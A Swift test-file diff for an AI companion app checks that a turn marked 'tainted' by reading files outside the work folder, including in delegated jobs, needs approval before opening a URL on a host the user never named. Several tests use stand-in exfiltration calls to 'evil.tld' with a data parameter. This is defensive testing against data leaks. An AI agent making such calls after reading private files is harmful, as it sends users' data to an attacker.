@@ -1,6 +1,6 @@
 import CompanionCore
 import CompanionCoreTestSupport
-import CompanionServices
+@testable import CompanionServices
 import CompanionServicesTestSupport
 import CompanionTestKit
 import Foundation
@@ -31,7 +31,7 @@ private final class Script: ChatProvider, @unchecked Sendable {
     func verify(_ key: String, provider: ProviderDescriptor) async throws {}
 }
 
-private func run(readPath: String?, workdir: String) async throws -> (approvals: Int, denied: [String]) {
+private func run(readPath: String?, workdir: String, tainted: Bool = false) async throws -> (approvals: Int, denied: [String]) {
     var calls: [ToolCallRef] = []
     if let readPath {
         calls.append(ToolCallRef(id: "r", name: "read_file", arguments: "{\"path\":\"\(readPath)\"}"))
@@ -43,7 +43,7 @@ private func run(readPath: String?, workdir: String) async throws -> (approvals:
         config: Config(workdir: workdir), approvals: DenyingApprovals())
     let (stream, continuation) = AsyncStream<JobEvent>.makeStream()
     let seen = RoundEvents(stream)
-    _ = try await executor.run(JobRequest(id: "j", goal: "g", context: ""), events: continuation)
+    _ = try await executor.run(JobRequest(id: "j", goal: "g", context: "", tainted: tainted), events: continuation)
     continuation.finish()
     return (await seen.approvals, await seen.denied)
 }
@@ -112,4 +112,62 @@ func inTheChatReadingInsideTheWorkFolderLeavesTheTurnClean() async throws {
     let tools = chatRunner(work: work)
     _ = await tools.execute(name: "read_file", argumentsJSON: "{\"path\":\"\(work)/a.txt\"}")
     expect(tools.approval(for: openCall("https://evil.tld/?d=x"), said: "") == nil, "leer dentro no contamina")
+}
+
+@Test @MainActor
+func aWorkFolderThatScopesNothingTaintsEveryRead() {
+    let home = FileManager.default.homeDirectoryForCurrentUser.resolvingSymlinksInPath().path
+    for workdir in [home, "/", (home as NSString).deletingLastPathComponent] {
+        let runner = NativeToolRunner(workdir: workdir, places: nil)
+        expect(runner.readsOutsideWorkdir(tool: "read_file", arguments: ["path": home + "/x"]),
+               "workdir \(workdir): leer ~/x marca el turno")
+    }
+    let scoped = NativeToolRunner(workdir: home + "/Documents", places: nil)
+    expect(!scoped.readsOutsideWorkdir(tool: "read_file", arguments: ["path": home + "/Documents/x"]),
+           "una carpeta propia sí acota: leer dentro no marca")
+}
+
+@Test(.timeLimit(.minutes(1))) @MainActor
+func aDelegatedJobKeepsTheTurnsMark() async throws {
+    let work = taintDir("job-mark").path
+    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
+    expectEq(try await run(readPath: nil, workdir: work, tainted: true).approvals, 1,
+             "padre marcado, delegate y luego web_fetch: pide aprobación")
+    expectEq(try await run(readPath: nil, workdir: work, tainted: false).approvals, 0, "sin marca: no pide")
+    let taint = TurnTaint()
+    taint.mark()
+    let runner = JobRunner(
+        executorProvider: OneProvider(), queue: JobQueue(), approvals: DenyingApprovals(), taint: taint)
+    let request = await runner.handoffToRequest(Handoff(goal: "g", context: "c"))
+    expect(request.tainted, "el handoff toma la marca del turno del padre")
+}
+
+private struct OneProvider: ExecutorProviderProtocol {
+    func selectExecutor(for _: Handoff) -> any Executor {
+        NativeExecutor(
+            descriptor: ExecutorCatalog.native, chatProvider: Script([]),
+            config: Config(workdir: "/tmp"), approvals: DenyingApprovals())
+    }
+}
+
+@Test @MainActor
+func aTaintedTurnAsksBeforeOpeningATabOnAHostNobodyNamed() {
+    let presence = BrowserPresence()
+    presence.set(.chrome)
+    let taint = TurnTaint()
+    let runner = BrowserToolRunner(
+        channel: FakeBrowserChannel(failure: ContractError(code: BridgeCode.timeout, message: "")),
+        presence: presence, taint: taint)
+    let call = ToolCallRef(id: "b", name: "browser_open", arguments: #"{"url":"https://evil.tld/a"}"#)
+    expect(runner.approval(for: call, said: "") == nil, "sin marca: abrir sigue libre")
+    taint.mark()
+    expect(runner.approval(for: call, said: "") != nil, "con marca y host no dicho: pide")
+    expect(runner.approval(for: call, said: "abre evil.tld") == nil, "con marca pero host dicho: no pide")
+}
+
+@Test func inQAARaisedAddressToAnUnnamedHostIsCritical() {
+    let call = openCall("https://evil.tld/?d=x")
+    let request = ApprovalRequest(requestId: "r", toolName: "open_url", summary: "open evil.tld", inputJSON: call.arguments)
+    expectEq(QALiveBand.band(request: request, call: call, said: ""), .critical, "host no dicho: Touch ID")
+    expectEq(QALiveBand.band(request: request, call: call, said: "abre evil.tld"), .act, "host dicho: pasa")
 }
